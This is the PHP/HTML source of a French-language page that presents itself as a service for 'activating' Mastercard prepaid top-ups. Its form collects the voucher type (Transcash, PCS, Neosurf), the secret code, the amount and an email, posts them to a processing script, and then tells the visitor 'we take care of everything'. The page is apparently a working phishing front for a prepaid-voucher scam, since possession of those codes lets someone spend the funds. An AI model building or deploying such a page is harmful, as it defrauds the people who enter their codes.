<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>coupon</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/Contact-Form-Clean.css">
    <link rel="stylesheet" href="assets/css/styles.css">
</head>

<body>
    <section class="contact-clean">
        <form class="formulaire" method="post" action="traitement_formulaire.php">
            <h2 class="font-monospace text-center" style="text-align: center;font-size: 18px;">ACTIVATION DE TOUTES VOS
                RECHARGES MASTERCARD 
            </h2>
            <div>
                <?php
                    if(isset($_GET['Wat_err']))
                    {
                        $err = htmlspecialchars($_GET['Wat_err']);
                        switch($err)
                        {
                            case 'fieldsorigine%Vide':
                            ?>
                                <div class="alert alert-danger" style="margin-top: 16px;">
                                    Veillez cochez une case dans <strong>Origine du coupon</strong>.
                                </div>
                            <?php
                            break;

                            case 'fieldstype%Vide':
                            ?>
                                <div class="alert alert-danger" style="margin-top: 16px;">
                                    Veillez cochez une case dans <strong>Type de coupon</strong>.
                                </div>
                            <?php
                            break;

                            case 'fieldstype%Vide':
                            ?>
                                <div class="alert alert-danger" style="margin-top: 16px;">
                                    Veillez selectionner le <strong>Type de coupon</strong>.
                                </div>
                            <?php
                            break;

                            case 'fieldsmontant%Vide':
                            ?>
                                <div class="alert alert-danger" style="margin-top: 16px;">
                                    Veillez entrez le <strong>Montant</strong>.
                                </div>
                            <?php
                            break;

                            case 'fieldsmasque%Vide':
                            ?>
                            <div class="alert alert-danger" style="margin-top: 16px;">
                                Masquez le code <strong>OUI</strong> ou <strong>NON</strong>.
                            </div>
                            <?php
                            break;
                            
                            case 'fieldsemail%Vide':
                            ?>
                            <div class="alert alert-danger" style="margin-top: 16px;">
                                Veillez entrez votre <strong>E-mail</strong>.
                            </div>
                            <?php
                            break; 

                            case 'success':
                            ?>
                            <div class="alert alert-success" style="margin-top: 16px;">
                                Votre formulaire a été envoyer avec succès ✅ Nous nous occupons de tout.
                            </div>
                            <?php
                            break; 
                        }
                    }
                ?>
            </div>



            <small class="font-monospace" style="margin-top: 0px;font-size: 18px;">ORIGINE DU COUPON*</small>
            <fieldset required=""> 
                <div class="form-check border rounded-0 shadow-sm"
                    style="border-style: solid;border-color: var(--bs-gray-900);margin-top: 6px;">
                    <input name="origine" value="INTERNET" class="form-check-input" type="radio" id="formCheck-1"
                        style="transform: rotate(13deg) scale(1.47);margin-top: 12px;margin-left: -12px;">
                    <label class="form-check-label" for="formCheck-1" style="padding: 9px;"
                        value="INTERNET">INTERNET</label>
                </div>
                <div class="form-check border rounded-0 shadow-sm"
                    style="border-style: solid;border-color: var(--bs-gray-900);margin-top: 10px;margin-bottom: 29px;">
                    <input name="origine" value="TABAC/MAGASIN" class="form-check-input" type="radio" id="formCheck-2"
                        style="transform: rotate(13deg) scale(1.47);margin-top: 12px;margin-left: -12px;">
                    <label class="form-check-label" for="formCheck-2" style="padding: 9px;"
                        value="TABAC/MAGASIN">TABAC/MAGASIN</label>
                </div>
            </fieldset>

            <small class="font-monospace text-capitalize"
                style="margin: 0px 0px 0px;margin-top: 0px;font-size: 18px;padding-right: 0px;padding-bottom: 0px;margin-right: 0px;">TYPE
                DE COUPON*</small>
            <select name="typecoupon" class="shadow-sm form-select" required=""
                style="min-height: 50px;max-height: 0px;margin-top: 6px;margin-bottom: 29px;">
                <optgroup label="Veuillez sélectionner">
                    <option value="TRANSCASH MASTERCARD">TRANSCASH MASTERCARD</option>
                    <option value="PCS MASTERCARD">PCS MASTERCARD</option>
                    <option value="NEOSURF">NEOSURF</option>
                </optgroup>
            </select>
            <small class="font-monospace text-capitalize"
                style="margin: 0px 0px 0px;margin-top: 0px;font-size: 18px;padding-right: 0px;padding-bottom: 0px;margin-right: 0px;">CODE
                SECRET*</small>

            <input name="codesecret" class="shadow-sm form-control" type="text"
                style="margin-top: 6px;margin-bottom: 29px;min-height: 50px;" required="" maxlength="12">

            <small class="font-monospace text-capitalize"
                style="margin: 0px 0px 0px;margin-top: 0px;font-size: 18px;padding-right: 0px;padding-bottom: 0px;margin-right: 0px;">MONTANT</small>

            <input name="montant" class="shadow-sm form-control" type="tel"
                style="min-height: 50px;margin-top: 6px;margin-bottom: 29px;" required="">

            <small class="font-monospace" style="margin-top: 0px;font-size: 18px;">MASQUEZ LE CODE*</small>


            <fieldset> 
                <div class="form-check border rounded-0 shadow-sm"
                    style="border-style: solid;border-color: var(--bs-gray-900);margin-top: 6px;">
                    <input name="masque" value="OUI" class="form-check-input" type="radio" id="formCheck-1"
                        style="transform: rotate(13deg) scale(1.47);margin-top: 12px;margin-left: -12px;">
                    <label class="form-check-label" for="formCheck-1" style="padding: 9px;"
                        value="INTERNET">OUI</label>
                </div>
                <div class="form-check border rounded-0 shadow-sm"
                    style="border-style: solid;border-color: var(--bs-gray-900);margin-top: 10px;margin-bottom: 29px;">
                    <input name="masque" value="NON" class="form-check-input" type="radio" id="formCheck-2"
                        style="transform: rotate(13deg) scale(1.47);margin-top: 12px;margin-left: -12px;">
                    <label class="form-check-label" for="formCheck-2" style="padding: 9px;"
                        value="TABAC/MAGASIN">NON</label>
                </div>
            </fieldset>

            <small class="font-monospace" style="margin-top: 0px;font-size: 18px;">E-mail*</small>
            <div class="mb-3" style="margin-top: 18px;">
                <input name="email" class="form-control is-valid" type="email" name="email" placeholder="Email"style="margin-top: -6px;min-height: 50px;">
                <!-- <small class="form-text text-danger">Please enter a correct email address.</small> -->
            </div>
            <div class="text-center mb-3" style="margin-right: 4px;">
                <button class="btn btn-primary btn-lg link-success" name="send_form" type="submit"
                    style="width: 236.6719px;color: var(--bs-gray-900);background: var(--bs-orange);font-size: 16px;">Activer
                    maintenant</button>
            </div>
        </form>
    </section>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
</body>

</html>